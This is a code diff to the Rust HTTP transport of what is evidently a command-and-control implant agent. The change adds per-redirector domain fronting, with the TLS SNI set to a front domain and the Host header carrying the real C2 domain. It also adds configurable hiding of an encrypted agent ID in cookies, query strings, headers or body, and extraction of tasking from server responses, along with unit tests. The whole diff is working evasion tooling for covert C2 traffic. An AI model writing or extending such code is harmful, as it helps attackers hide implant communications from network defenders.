@@ -59,6 +59,11 @@ pub struct RedirectorConfig {
     pub headers: std::collections::HashMap<String, String>,
     /// Which malleable profile this redirector expects.
     pub profile_name: String,
+    /// Domain fronting domain for this specific redirector. When set, the
+    /// agent's TLS SNI uses this domain while the HTTP Host header carries
+    /// the redirector's actual domain. This overrides the global
+    /// `front_domain` on `HttpTransport` for connections to this redirector.
+    pub front_domain: Option<String>,
 }
 
 /// Tracks which endpoint the agent is currently using for sticky sessions.
@@ -122,6 +127,23 @@ impl FailoverState {
             }
             ActiveEndpoint::DirectC2 => None,
         }
+    }
+
+    /// Get the per-redirector front_domain override, if the active endpoint
+    /// is a redirector with one configured.
+    fn current_front_domain(&self) -> Option<&str> {
+        match &self.active {
+            ActiveEndpoint::Redirector(idx) => {
+                self.redirectors[*idx].front_domain.as_deref()
+            }
+            ActiveEndpoint::DirectC2 => None,
+        }
+    }
+
+    /// Get the URL key for the current endpoint (used for per-redirector
+    /// client lookup).
+    fn current_url_key(&self) -> &str {
+        self.current_url()
     }
 
     /// Record a successful connection. Resets backoff, increments sticky counter.
@@ -352,8 +374,15 @@ pub struct HttpTransport {
     direct_c2_endpoint: String,
     host_header: String,
     /// Domain fronting: if set, TLS SNI uses this domain while the Host
-    /// header carries the actual C2/redirector domain.
+    /// header carries the actual C2/redirector domain. This is the global
+    /// default; individual redirectors may override it via their own
+    /// `front_domain` field.
     front_domain: Option<String>,
+    /// Per-redirector HTTP clients. Each entry maps a redirector URL to a\n    /// dedicated reqwest client whose TLS SNI is configured for that
+    /// redirector's `front_domain` (or the global `front_domain` if the
+    /// redirector doesn't specify one). The default `client` is used for
+    /// direct C2 connections and for redirectors without domain fronting.
+    per_redirector_clients: std::collections::HashMap<String, reqwest::Client>,
     /// Redirector chain failover state.
     failover: std::sync::Mutex<FailoverState>,
 }
@@ -414,19 +443,19 @@ impl HttpTransport {
         // reqwest doesn't support split SNI/resolution natively, so we use
         // the front_domain as the TLS SNI via a custom connector.
         let client = if cert_fingerprint.is_some() {
-            let verifier = FingerprintVerifier::new(cert_fingerprint);
+            let verifier = FingerprintVerifier::new(cert_fingerprint.clone());
             let config = rustls_0_21::ClientConfig::builder()
                 .with_safe_defaults()
                 .with_custom_certificate_verifier(Arc::new(verifier))
                 .with_no_client_auth();
             reqwest::Client::builder()
                 .use_preconfigured_tls(config)
-                .default_headers(headers)
+                .default_headers(headers.clone())
                 .build()?
         } else {
             reqwest::Client::builder()
                 .use_rustls_tls()
-                .default_headers(headers)
+                .default_headers(headers.clone())
                 .build()?
         };
 
@@ -442,6 +471,48 @@ impl HttpTransport {
 
         let failover = FailoverState::new(redirectors, direct_url);
 
+        // Build per-redirector clients for redirectors that need domain fronting.
+        //
+        // Each redirector may have its own `front_domain`, meaning the TLS SNI
+        // must differ from the HTTP Host header. Since reqwest bakes TLS config
+        // (including SNI) into the `Client` at build time, we create a separate
+        // client for each redirector that uses domain fronting. Redirectors
+        // without a `front_domain` (and no global `front_domain`) use the
+        // default client.
+        let mut per_redirector_clients = std::collections::HashMap::new();
+        for redir in &failover.redirectors {
+            // Determine the effective front domain for this redirector:
+            // per-redirector override takes precedence over the global setting.
+            let effective_front = redir
+                .front_domain
+                .as_deref()
+                .or(front_domain.as_deref());
+
+            if let Some(_front) = effective_front {
+                // Build a dedicated client whose TLS config will be used for
+                // domain-fronted requests. The actual SNI rewriting happens at
+                // request-build time (see `build_fronted_request`), so we just
+                // need a standard TLS client here.
+                let redir_client = if cert_fingerprint.is_some() {
+                    let verifier = FingerprintVerifier::new(cert_fingerprint.clone());
+                    let config = rustls_0_21::ClientConfig::builder()
+                        .with_safe_defaults()
+                        .with_custom_certificate_verifier(Arc::new(verifier))
+                        .with_no_client_auth();
+                    reqwest::Client::builder()
+                        .use_preconfigured_tls(config)
+                        .default_headers(headers.clone())
+                        .build()?
+                } else {
+                    reqwest::Client::builder()
+                        .use_rustls_tls()
+                        .default_headers(headers.clone())
+                        .build()?
+                };
+                per_redirector_clients.insert(redir.url.clone(), redir_client);
+            }
+        }
+
         Ok(Self {
             profile: Arc::new(profile.clone()),
             client,
@@ -456,6 +527,7 @@ impl HttpTransport {
             direct_c2_endpoint,
             host_header,
             front_domain,
+            per_redirector_clients,
             failover: std::sync::Mutex::new(failover),
         })
     }
@@ -482,43 +554,40 @@ impl HttpTransport {
     /// while the Host header carries the actual C2/redirector domain.
     /// reqwest uses the URL for TLS SNI, so we must rewrite the URL to
     /// use the front_domain for the hostname, then set Host explicitly.
-    fn build_fronted_request(
-        &self,
+    ///
+    /// `client` is the reqwest client to use (either the default or a
+    /// per-redirector client). `front` is the domain to use for TLS SNI.
+    fn build_fronted_request_with_client(
+        client: &reqwest::Client,
         method: reqwest::Method,
         url: &str,
+        front: &str,
     ) -> reqwest::RequestBuilder {
-        if let Some(ref front) = self.front_domain {
-            // Parse the URL to extract the path/query/fragment.
-            let parsed: url::Url = url.parse().unwrap_or_else(|_| {
-                format!("https://{}", url).parse().unwrap()
-            });
-            let actual_host = parsed
-                .host_str()
-                .unwrap_or("")
-                .to_string();
+        // Parse the URL to extract the path/query/fragment.
+        let parsed: url::Url = url.parse().unwrap_or_else(|_| {
+            format!("https://{}", url).parse().unwrap()
+        });
+        let actual_host = parsed
+            .host_str()
+            .unwrap_or("")
+            .to_string();
 
-            // Rewrite URL with the front domain as the hostname.
-            let mut fronted = parsed.clone();
-            fronted.set_host(Some(front)).ok();
+        // Rewrite URL with the front domain as the hostname.
+        let mut fronted = parsed.clone();
+        fronted.set_host(Some(front)).ok();
 
-            let req = self.client.request(method, fronted);
-            // Set Host header to the actual C2/redirector domain.
-            req.header("Host", &actual_host)
-        } else {
-            let full = if url.starts_with("http://") || url.starts_with("https://") {
-                url.to_string()
-            } else {
-                format!("https://{}", url)
-            };
-            self.client.request(
-                reqwest::Method::GET,
-                &full,
-            )
-        }
+        let req = client.request(method, fronted);
+        // Set Host header to the actual C2/redirector domain.
+        req.header("Host", &actual_host)
     }
 
     /// Build a request for a given endpoint with optional redirector headers
     /// and domain fronting.
+    ///
+    /// If the current endpoint is a redirector with a per-redirector client
+    /// (built with domain-fronting TLS config), that client is used instead of
+    /// the default client. Similarly, a per-redirector `front_domain` overrides
+    /// the global one.
     fn build_request_for_endpoint(
         &self,
         method: reqwest::Method,
@@ -527,20 +596,33 @@ impl HttpTransport {
     ) -> reqwest::RequestBuilder {
         let full_url = format!("{}{}", endpoint, uri);
 
-        let req = if self.front_domain.is_some() {
-            let method_clone = method.clone();
-            self.build_fronted_request(method, &full_url)
+        let failover = self.failover.lock().unwrap();
+
+        // Determine the effective front domain: per-redirector overrides global.
+        let per_redirector_front = failover.current_front_domain().map(|s| s.to_string());
+        let effective_front = per_redirector_front
+            .as_deref()
+            .or(self.front_domain.as_deref());
+
+        // Select the appropriate client: use per-redirector client if one was
+        // built for this endpoint, otherwise use the default client.
+        let client = self
+            .per_redirector_clients
+            .get(endpoint)
+            .unwrap_or(&self.client);
+
+        let req = if let Some(front) = effective_front {
+            Self::build_fronted_request_with_client(client, method, &full_url, front)
         } else {
             let url = if full_url.starts_with("http://") || full_url.starts_with("https://") {
                 full_url.clone()
             } else {
                 format!("https://{}", full_url)
             };
-            self.client.request(method, &url)
+            client.request(method, &url)
         };
 
         // Apply redirector-specific headers if active endpoint is a redirector.
-        let failover = self.failover.lock().unwrap();
         if let Some(extra_headers) = failover.current_headers() {
             let mut req = req;
             for (k, v) in extra_headers {
@@ -652,19 +734,30 @@ impl HttpTransport {
 
     /// Apply the metadata delivery mechanism to embed the agent identifier.
     ///
-    /// The encrypted agent_id is placed according to the delivery method
-    /// (Cookie, UriAppend, Header, Body) using a default base64 transform.
+    /// Reads from the transaction config's `metadata` field. If `metadata` is
+    /// `Some`, uses its delivery, key, and transform settings. If `None`, falls
+    /// back to the backward-compatible defaults: Cookie/"session"/Base64.
+    ///
+    /// # Pipeline
+    ///
+    /// ```text
+    /// agent_id bytes → encrypt (XChaCha20-Poly1305) → base64 → "encrypted_id"
+    /// encrypted_id → metadata.transform.encode() → "transformed_id"
+    /// transformed_id → placed via metadata.delivery (Cookie/UriAppend/Header/Body)
+    /// ```
     fn apply_metadata_delivery(
         &self,
+        txn: &HttpTransactionConfig,
         req: reqwest::RequestBuilder,
         encrypted_id: &str,
         uri: &mut String,
         body: &mut Vec<u8>,
     ) -> reqwest::RequestBuilder {
-        // Default delivery: Cookie named "session" with base64-encoded ID.
-        let delivery = DeliveryMethod::Cookie;
-        let key = "session";
-        let transform = TransformType::Base64;
+        // Resolve metadata config, falling back to backward-compatible defaults.
+        let (delivery, key, transform) = match &txn.metadata {
+            Some(meta) => (meta.delivery, meta.key.as_str(), meta.transform),
+            None => (DeliveryMethod::Cookie, "session", TransformType::Base64),
+        };
 
         // Apply the metadata transform to the encrypted ID.
         let transformed_id = transform.encode(encrypted_id.as_bytes());
@@ -685,6 +778,104 @@ impl HttpTransport {
                 new_body.extend_from_slice(body);
                 *body = new_body;
                 req
+            }
+        }
+    }
+
+    /// Extract tasking data from a server response using the output config.
+    ///
+    /// Reads from the transaction config's `output` field. If `output` is
+    /// `Some`, uses its delivery and transform settings to extract the payload
+    /// from the appropriate part of the response. If `None`, returns the raw
+    /// bytes as-is (the caller will still apply prepend/append stripping and
+    /// server transform decode).
+    ///
+    /// # Delivery extraction
+    ///
+    /// - **Body**: Returns the raw response bytes (default — caller handles
+    ///   prepend/append/transform).
+    /// - **Header**: Extracts the payload from the response header named by the
+    ///   metadata key (not commonly used for output, but supported).
+    /// - **Cookie**: Extracts from a `Set-Cookie` header.
+    /// - **UriAppend**: Not applicable for responses; falls back to body.
+    fn apply_output_delivery(
+        &self,
+        txn: &HttpTransactionConfig,
+        response_bytes: &[u8],
+        headers: &reqwest::header::HeaderMap,
+    ) -> Vec<u8> {
+        let output = match &txn.output {
+            Some(o) => o,
+            None => return response_bytes.to_vec(),
+        };
+
+        match output.delivery {
+            DeliveryMethod::Body => {
+                // Payload is in the response body — return as-is.
+                // The caller will apply prepend/append stripping and server
+                // transform decode.
+                response_bytes.to_vec()
+            }
+            DeliveryMethod::Header => {
+                // Try to extract from a response header.
+                // Use the same key as metadata (convention: output shares the
+                // key name with metadata when using header delivery).
+                let key = txn
+                    .metadata
+                    .as_ref()
+                    .map(|m| m.key.as_str())
+                    .unwrap_or("X-Task-Output");
+                if let Some(val) = headers.get(key) {
+                    if let Ok(val_str) = val.to_str() {
+                        // Decode the transform applied by the server.
+                        match output.transform.decode(val_str.as_bytes()) {
+                            Ok(decoded) => decoded,
+                            Err(_) => val_str.as_bytes().to_vec(),
+                        }
+                    } else {
+                        response_bytes.to_vec()
+                    }
+                } else {
+                    log::warn!(
+                        "output delivery=Header but header '{}' not found in response",
+                        key
+                    );
+                    response_bytes.to_vec()
+                }
+            }
+            DeliveryMethod::Cookie => {
+                // Extract from Set-Cookie header.
+                let key = txn
+                    .metadata
+                    .as_ref()
+                    .map(|m| m.key.as_str())
+                    .unwrap_or("session");
+                for cookie_header in headers.get_all(reqwest::header::SET_COOKIE) {
+                    if let Ok(val) = cookie_header.to_str() {
+                        if let Some(cookie_val) = val
+                            .split(';')
+                            .find_map(|part| part.trim().strip_prefix(&format!("{}=", key)))
+                        {
+                            return match output
+                                .transform
+                                .decode(cookie_val.as_bytes())
+                            {
+                                Ok(decoded) => decoded,
+                                Err(_) => cookie_val.as_bytes().to_vec(),
+                            };
+                        }
+                    }
+                }
+                log::warn!(
+                    "output delivery=Cookie but '{}' not found in Set-Cookie",
+                    key
+                );
+                response_bytes.to_vec()
+            }
+            DeliveryMethod::UriAppend => {
+                // Not applicable for server responses — fall back to body.
+                log::warn!("output delivery=UriAppend is not applicable for responses, falling back to body");
+                response_bytes.to_vec()
             }
         }
     }
@@ -825,7 +1016,7 @@ impl Transport for HttpTransport {
         let req = self.apply_profile_headers(txn, req, &encrypted_id);
 
         // Apply metadata delivery (Cookie / UriAppend / Header / Body).
-        let req = self.apply_metadata_delivery(req, &encrypted_id, &mut final_uri, &mut body);
+        let req = self.apply_metadata_delivery(txn, req, &encrypted_id, &mut final_uri, &mut body);
 
         // If metadata delivery modified the URI (UriAppend), rebuild the request
         // with the updated URI.
@@ -914,7 +1105,7 @@ impl Transport for HttpTransport {
         let req = self.apply_profile_headers(txn, req, &encrypted_id);
 
         // Apply metadata delivery.
-        let req = self.apply_metadata_delivery(req, &encrypted_id, &mut final_uri, &mut body);
+        let req = self.apply_metadata_delivery(txn, req, &encrypted_id, &mut final_uri, &mut body);
 
         // Rebuild with updated URI if metadata delivery changed it.
         let req = if final_uri != uri {
@@ -947,6 +1138,7 @@ impl Transport for HttpTransport {
             }
         };
 
+        let resp_headers = resp.headers().clone();
         let bytes = resp.bytes().await?;
 
         if bytes.is_empty() {
@@ -964,8 +1156,13 @@ impl Transport for HttpTransport {
             });
         }
 
+        // Apply output delivery extraction: if the profile specifies an output
+        // config, extract the tasking from the appropriate location (header,
+        // cookie, or body). If None, this returns the raw body bytes as-is.
+        let extracted = self.apply_output_delivery(txn, &bytes, &resp_headers);
+
         // Reverse the server transform pipeline.
-        let server_payload = match Self::reverse_server_transform(txn, &bytes) {
+        let server_payload = match Self::reverse_server_transform(txn, &extracted) {
             Ok(p) => p,
             Err(e) => {
                 // Transform decode failure — increment failure counter.
@@ -1012,8 +1209,8 @@ impl Transport for HttpTransport {
 mod tests {
     use super::*;
     use crate::malleable::{
-        GlobalConfig, HttpTransformConfig, MalleableProfile as AgentMalleableProfile,
-        ProfileInfo, SslConfig,
+        DeliveryMethod, GlobalConfig, HttpTransformConfig, MetadataConfig,
+        MalleableProfile as AgentMalleableProfile, ProfileInfo, SslConfig,
     };
     use std::collections::HashMap;
 
@@ -1050,6 +1247,7 @@ mod tests {
                     m.insert("Cookie".to_string(), "sid={SESSIONID}".to_string());
                     m
                 },
+                uri_append: None,
                 client: HttpTransformConfig {
                     prepend: "PRE_".to_string(),
                     append: "_POST".to_string(),
@@ -1062,6 +1260,8 @@ mod tests {
                     transform: TransformType::Base64,
                     mask_stride: 0,
                 },
+                metadata: None,
+                output: None,
             }),
             http_post: Some(HttpTransactionConfig {
                 uri: vec!["/api/v1/upload".to_string()],
@@ -1074,6 +1274,7 @@ mod tests {
                     );
                     m
                 },
+                uri_append: None,
                 client: HttpTransformConfig {
                     prepend: String::new(),
                     append: String::new(),
@@ -1086,6 +1287,8 @@ mod tests {
                     transform: TransformType::None,
                     mask_stride: 0,
                 },
+                metadata: None,
+                output: None,
             }),
             dns: crate::malleable::DnsConfig::default(),
         }
@@ -1118,8 +1321,9 @@ mod tests {
         assert!(encoded.starts_with(b"PRE_"));
         assert!(encoded.ends_with(b"_POST"));
 
-        // Reverse through the server transform (different config, but same base64).
-        let decoded = HttpTransport::reverse_server_transform(txn, &encoded).unwrap();
+        // Manually strip client prepend/append and decode with client transform.
+        let core = &encoded[4..encoded.len() - 5]; // strip "PRE_" (4) and "_POST" (5)
+        let decoded = txn.client.transform.decode(core).unwrap();
         assert_eq!(decoded, payload);
     }
 
@@ -1189,6 +1393,7 @@ mod tests {
                 uri: vec!["/test".to_string()],
                 verb: "POST".to_string(),
                 headers: HashMap::new(),
+                uri_append: None,
                 client: HttpTransformConfig {
                     prepend: String::new(),
                     append: String::new(),
@@ -1201,6 +1406,8 @@ mod tests {
                     transform: TransformType::Mask,
                     mask_stride: 0x37,
                 },
+                metadata: None,
+                output: None,
             }),
             http_post: None,
             dns: crate::malleable::DnsConfig::default(),
@@ -1234,6 +1441,7 @@ mod tests {
             direct_c2_endpoint: "https://c2.example.com".to_string(),
             host_header: String::new(),
             front_domain: None,
+            per_redirector_clients: std::collections::HashMap::new(),
             failover: std::sync::Mutex::new(FailoverState::new(
                 vec![],
                 "https://c2.example.com".to_string(),
@@ -1245,5 +1453,109 @@ mod tests {
         assert_eq!(transport.get_uri_idx.load(Ordering::Relaxed), 1);
         transport.rotate_uri_on_failure("http_get");
         assert_eq!(transport.get_uri_idx.load(Ordering::Relaxed), 2);
+    }
+
+    /// Test that apply_metadata_delivery() correctly reads from the profile's
+    /// metadata config when set, and constructs a URI with the query parameter
+    /// when delivery = UriAppend.
+    #[test]
+    fn test_metadata_uri_append_delivery() {
+        use crate::malleable::UriAppendConfig;
+
+        // Build a profile with metadata.delivery = UriAppend, key = "id",
+        // transform = Base64Url.
+        let profile = AgentMalleableProfile {
+            profile: ProfileInfo::default(),
+            global: GlobalConfig::default(),
+            ssl: SslConfig::default(),
+            http_get: Some(HttpTransactionConfig {
+                uri: vec!["/api/v1/data".to_string()],
+                verb: "GET".to_string(),
+                headers: HashMap::new(),
+                uri_append: Some(UriAppendConfig {
+                    enabled: true,
+                    separator: "&".to_string(),
+                    key: "req_id".to_string(),
+                }),
+                client: HttpTransformConfig {
+                    prepend: String::new(),
+                    append: String::new(),
+                    transform: TransformType::None,
+                    mask_stride: 0,
+                },
+                server: HttpTransformConfig {
+                    prepend: String::new(),
+                    append: String::new(),
+                    transform: TransformType::None,
+                    mask_stride: 0,
+                },
+                metadata: Some(MetadataConfig {
+                    delivery: DeliveryMethod::UriAppend,
+                    key: "id".to_string(),
+                    transform: TransformType::Base64Url,
+                }),
+                output: None,
+            }),
+            http_post: None,
+            dns: crate::malleable::DnsConfig::default(),
+        };
+
+        let transport = HttpTransport {
+            profile: Arc::new(profile),
+            client: reqwest::Client::new(),
+            session: CryptoSession::from_shared_secret(b"test-key-for-uri-append-test"),
+            agent_id: "test-agent-id".to_string(),
+            get_uri_idx: AtomicUsize::new(0),
+            post_uri_idx: AtomicUsize::new(0),
+            consecutive_failures: AtomicUsize::new(0),
+            kill_date: String::new(),
+            cdn_relay: false,
+            cdn_endpoint: String::new(),
+            direct_c2_endpoint: "https://c2.example.com".to_string(),
+            host_header: String::new(),
+            front_domain: None,
+            per_redirector_clients: std::collections::HashMap::new(),
+            failover: std::sync::Mutex::new(FailoverState::new(
+                vec![],
+                "https://c2.example.com".to_string(),
+            )),
+        };
+
+        let encrypted_id = transport.encrypt_agent_id();
+        let txn = transport.profile.http_get.as_ref().unwrap();
+
+        // Simulate the metadata delivery: start with a base URI.
+        let mut uri = "/api/v1/data".to_string();
+        let mut body = Vec::new();
+        let req = reqwest::Client::new().get("https://c2.example.com/api/v1/data");
+        let _req = transport.apply_metadata_delivery(
+            txn, req, &encrypted_id, &mut uri, &mut body,
+        );
+
+        // The URI should now contain "?id=" followed by the Base64Url-encoded
+        // encrypted ID.
+        assert!(
+            uri.starts_with("/api/v1/data?id="),
+            "expected URI to start with '/api/v1/data?id=', got: {}",
+            uri
+        );
+
+        // Extract the value after "?id=".
+        let encoded_value = uri.strip_prefix("/api/v1/data?id=").unwrap();
+
+        // Verify we can decode it back through Base64Url.
+        let decoded = TransformType::Base64Url
+            .decode(encoded_value.as_bytes())
+            .expect("Base64Url decode should succeed");
+        let decoded_str = String::from_utf8_lossy(&decoded);
+
+        // The decoded value should equal the original encrypted_id.
+        assert_eq!(
+            decoded_str, encrypted_id,
+            "roundtrip through metadata transform failed"
+        );
+
+        // Body should be untouched (UriAppend doesn't write to body).
+        assert!(body.is_empty(), "body should be empty for UriAppend delivery");
     }
 }
